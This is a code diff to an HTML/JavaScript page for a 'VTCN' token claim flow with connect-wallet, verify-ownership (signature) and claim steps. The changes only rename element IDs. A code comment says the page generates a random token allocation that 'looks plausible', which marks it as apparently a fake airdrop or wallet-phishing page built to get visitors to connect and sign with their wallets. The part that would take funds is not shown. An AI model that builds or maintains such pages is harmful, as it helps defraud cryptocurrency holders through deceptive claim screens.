@@ -148,8 +148,8 @@
       <div class="progress">
         <div class="bar-fill" id="pf" style="width:0%"></div>
         <div class="pstep active" id="ps1"><div class="dot2">1</div><div class="lbl">Connect</div></div>
-        <div class="pstep" id="ps2_view"><div class="dot2">2</div><div class="lbl">View</div></div>
-        <div class="pstep" id="ps3_claim"><div class="dot2">3</div><div class="lbl">Claim</div></div>
+        <div class="pstep" id="ps2"><div class="dot2">2</div><div class="lbl">View</div></div>
+        <div class="pstep" id="ps3"><div class="dot2">3</div><div class="lbl">Claim</div></div>
       </div>
 
       <h2>Connect your wallet</h2>
@@ -178,12 +178,12 @@
     </div>
 
     <!-- ============ STEP 3: SIGN (CLAIM VERIFICATION) ============ -->
-    <div class="step" id="s2_view">
+    <div class="step" id="s2">
       <div class="progress">
         <div class="bar-fill" id="pf2" style="width:50%"></div>
-        <div class="pstep done" id="ps1b"><div class="dot2">✓</div><div class="lbl">Connect</div></div>
-        <div class="pstep active" id="ps2b"><div class="dot2">2</div><div class="lbl">Verify</div></div>
-        <div class="pstep" id="ps3b"><div class="dot2">3</div><div class="lbl">View</div></div>
+        <div class="pstep done" id="ps1_done"><div class="dot2">✓</div><div class="lbl">Connect</div></div>
+        <div class="pstep active" id="ps2_active"><div class="dot2">2</div><div class="lbl">Verify</div></div>
+        <div class="pstep" id="ps3"><div class="dot2">3</div><div class="lbl">View</div></div>
       </div>
 
       <h2>Verify ownership</h2>
@@ -215,7 +215,7 @@
     </div>
 
     <!-- ============ STEP 4: SUCCESS / REDIRECT ============ -->
-    <div class="step" id="s3_claim">
+    <div class="step" id="s3">
       <div class="progress">
         <div class="bar-fill" id="pf3" style="width:100%"></div>
         <div class="pstep done"><div class="dot2">✓</div><div class="lbl">Connect</div></div>
@@ -352,7 +352,7 @@ function goConnect(){ show('s2'); }
 function goSign(){ // Auto-called after connect
 
   document.getElementById('addrShow').textContent=W.addr?W.addr.slice(0,6)+'...'+W.addr.slice(-4):'0x...';
-  show('s2_view');
+  show('s2');
 }
 function goSuccess(txid){
   // Generate random VTCN allocation (0.5 - 5,000 VTCN, looks plausible)
@@ -363,7 +363,7 @@ function goSuccess(txid){
   document.getElementById('vtcnAmount').textContent=vtcnAmt;
   document.getElementById('vtcnUsd').textContent=vtcnUsd;
   document.getElementById('vtcnAmount2').textContent=vtcnAmt;
-  show('s3_claim');
+  show('s3');
   // Don't auto-redirect — wait for user to click Claim
 }
 
